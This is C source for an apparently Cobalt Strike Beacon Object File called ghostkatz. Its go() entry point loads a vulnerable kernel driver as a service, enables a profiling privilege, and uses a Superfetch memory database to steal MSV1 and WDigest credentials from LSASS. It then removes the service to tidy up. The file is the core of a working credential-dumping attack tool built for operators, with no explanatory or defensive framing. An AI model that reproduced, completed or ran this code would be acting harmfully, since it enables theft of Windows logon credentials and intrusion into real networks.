#include <windows.h>

#include "beacon.h"
#include "defs.h"
#include "provider.h"
#include "ghostkatz.h"


#include "provider.c"
#include "utils.c"
#include "privileges.c"
#include "superfetch.c"
#include "lsass.c"
#include "eprocess.c"
#include "lsass_getkeys.c"
#include "lsass_logonpasswords.c"
#include "lsass_wdigest.c"
#include "services.c"

formatp outputbuffer;

int provider = -1;

int go(char *args, int argLen)
{
    datap parser;
	BeaconDataParse(&parser, args, argLen);
    
    int modeLen = 0;
    char* mode = BeaconDataExtract(&parser, &modeLen);

    if (!mode || modeLen <= 0 || mode[0] == '\0')
    {
        BeaconPrintf(CALLBACK_ERROR, "Missing mode argument (logonpasswords or wdigest)!");
        return FALSE;
    }

    if (BeaconDataLength(&parser) >= (int)sizeof(int))
    {
        provider = BeaconDataInt(&parser);
    }

    if (provider <= 0)
        provider = 1;

    if (BeaconDataLength(&parser) != 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid number of arguments!");
        return FALSE;
    }

    BOOL RetrieveMSV1Credentials = FALSE;
    BOOL RetrieveWDigestCredentials = FALSE;

    if (strcmp(mode, "logonpasswords") == 0)
    {
        RetrieveMSV1Credentials = TRUE;
    }
    if (strcmp(mode, "wdigest") == 0)
    {
        RetrieveWDigestCredentials = TRUE;
    }

    if (!RetrieveMSV1Credentials && !RetrieveWDigestCredentials)
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid argument!");
        return FALSE;
    }

    PROVIDER_INFO* prov_info = GetProviderInfo(provider);
    if (prov_info == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid provider ID: %d", provider);
        return FALSE;
    }
    else
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[INFO] Provider: %s", prov_info->service_name);
    }

    // We can create buffer now that the initial checks have passed
    BeaconFormatAlloc(&outputbuffer, 12288);

    BOOL bResult = EnablePrivilege(SE_PROF_SINGLE_PROCESS_PRIVILEGE);
    if (!bResult) 
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to enable privilege! Error code: %llx", GetLastError());
        BeaconFormatFree(&outputbuffer);
        return FALSE;
    }
    BeaconFormatPrintf(&outputbuffer, "[+] Enabled SE_PROF_SINGLE_PROCESS_PRIVILEGE\n");


    // Get Windows build number
    DWORD NT_MAJOR_VERSION, NT_MINOR_VERSION, NT_BUILD_NUMBER;
    RtlGetNtVersionNumbers(&NT_MAJOR_VERSION, &NT_MINOR_VERSION, &NT_BUILD_NUMBER);
    NT_BUILD_NUMBER &= 0x7FFF;
    BeaconFormatPrintf(&outputbuffer, "[+] Windows Build Number: %ld\n", NT_BUILD_NUMBER);


    // Install service
    if (!isServiceInstalled())
    {
        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
        BeaconFormatFree(&outputbuffer);
        return FALSE;
    }


    // Get handle to driver
    HANDLE hFile = CreateFileW(prov_info->device_name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        BeaconFormatPrintf(&outputbuffer, "[!] Failed to get handle to vulnerable driver!\n");

        if (!removeService())
        {
            BeaconFormatPrintf(&outputbuffer, "[!] Failed to remove driver service!\n");
        }

        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
        BeaconFormatFree(&outputbuffer);
        return FALSE;
    }


    // Check which Superfetch version to use based on build number
    BOOL use_PF_MEMORYRANGEINFO_V2 = TRUE;

    if (NT_BUILD_NUMBER < KULL_M_WIN_BUILD_10_1803)  // https://www.unknowncheats.me/forum/general-programming-and-reversing/397104-ntquerysysteminformation-systemsuperfetchinformation.html
        use_PF_MEMORYRANGEINFO_V2 = FALSE;

        
    // Create Superfetch Database
    if (!CreateGlobalSuperfetchDatabase(use_PF_MEMORYRANGEINFO_V2))
    {
        if (!removeService())
        {
            BeaconFormatPrintf(&outputbuffer, "[!] Failed to remove driver service!\n");
        }

        BeaconFormatPrintf(&outputbuffer, "[+] Closing handle to vulnerable driver\n");
        CloseHandle(hFile);

        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
        BeaconFormatFree(&outputbuffer);
        return FALSE;
    }


    if (!StealLSASSCredentials(hFile, NT_BUILD_NUMBER, RetrieveMSV1Credentials, RetrieveWDigestCredentials))
    {
        BeaconFormatPrintf(&outputbuffer, "[!] Failed to retrieve LSASS credentials!\n\n");
    }


    BeaconFormatPrintf(&outputbuffer, "[+] Closing handle to vulnerable driver\n");
    CloseHandle(hFile);
    
    // Stop and delete service
    if (!removeService())
    {
        BeaconFormatPrintf(&outputbuffer, "[!] Failed to remove driver service!\n");
    }

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
    BeaconFormatFree(&outputbuffer);
    
    return 0;
}
